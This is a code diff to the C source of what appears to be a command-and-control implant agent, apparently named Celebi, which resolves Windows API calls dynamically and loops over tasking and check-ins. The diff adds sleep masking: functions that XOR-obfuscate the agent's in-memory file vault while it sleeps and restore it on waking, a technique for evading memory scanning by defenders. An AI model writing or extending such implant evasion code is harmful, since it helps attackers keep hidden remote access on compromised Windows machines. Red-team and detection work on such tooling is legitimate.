@@ -34,6 +34,28 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
+void agent_mask(AgentState *state) {
+	// Don't bother masking for interactive agents.
+	if (state->sleep_time < 3) {
+		return;
+	}
+	
+	// Only obfuscates the file vault, not the agent itself (for now). TODO
+	// This should be a PICO, but for now the obfuscation algorithm is built-in. TODO
+	xorify(state->file_vault.data, state->file_vault.data, state->file_vault.data_size, XORKEY, XORKEY_LEN);
+}
+
+void agent_unmask(AgentState *state) {
+	// Don't bother masking for interactive agents.
+	if (state->sleep_time < 3) {
+		return;
+	}
+	
+	// Only deobfuscates the file vault, not the agent itself (for now). TODO
+	// This should be a PICO, but for now the deobfuscation algorithm is built-in. (TODO)
+	xorify(state->file_vault.data, state->file_vault.data, state->file_vault.data_size, XORKEY, XORKEY_LEN);
+}
+
 void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
 	TaskPostReply reply = { 0 };
 	BOOL result;
@@ -334,7 +356,7 @@ void go() {
 	dprintf("Resolved PICO loading functions.");
 	#endif
 	
-	state.builtin_picos = load_builtin_picos(&state.file_vault, XORKEY);
+	state.builtin_picos = load_builtin_picos(&state.file_vault, XORKEY, XORKEY_LEN);
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Loaded PICO capabilities.");
@@ -370,8 +392,9 @@ void go() {
 	state.builtin_picos.checkin = "(UNALLOCATED)";
 	
 	while (1) {
-		// Look ma, no masking!
+		agent_mask(&state);
 		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), state.sleep_time * 1000);
+		agent_unmask(&state);
 		
 		TaskingReply tasking_reply = { 0 };
 		BOOL task_result = perform_tasking(&state, &tasking_reply);
